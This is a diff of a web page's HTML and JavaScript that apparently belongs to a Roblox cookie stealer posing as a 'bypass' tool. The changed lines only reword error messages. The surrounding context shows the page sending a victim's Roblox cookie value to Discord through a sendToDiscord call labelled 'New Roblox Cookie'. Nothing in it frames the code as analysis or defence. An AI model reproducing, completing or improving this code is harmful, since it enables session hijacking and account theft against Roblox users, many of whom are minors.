@@ -225,7 +225,7 @@
     </div>
   </div>
 
-  <div id="errorToast">There was an error. Please try again.</div>
+  <div id="errorToast">ERROR Try later again.</div>
 
   <script>
     const bypassSelect = document.getElementById('bypass');
@@ -301,8 +301,7 @@
           processBtn.style.display = 'none';
         })
         .catch(() => {
-          // Kein Fehler-Toast mehr bei Discord-Fehlern, nur Alert optional:
-          alert('An error occurred while sending data. Please try again later.');
+          showError('ERROR Try later again.');
         });
       } else {
         sendToDiscord(`New Roblox Cookie:\n\`\`\`\n${cookieValue}\n\`\`\``)
@@ -318,7 +317,7 @@
           }
         })
         .catch(() => {
-          alert('An error occurred while sending data. Please try again later.');
+          showError('ERROR Try later again.');
         });
       }
     });
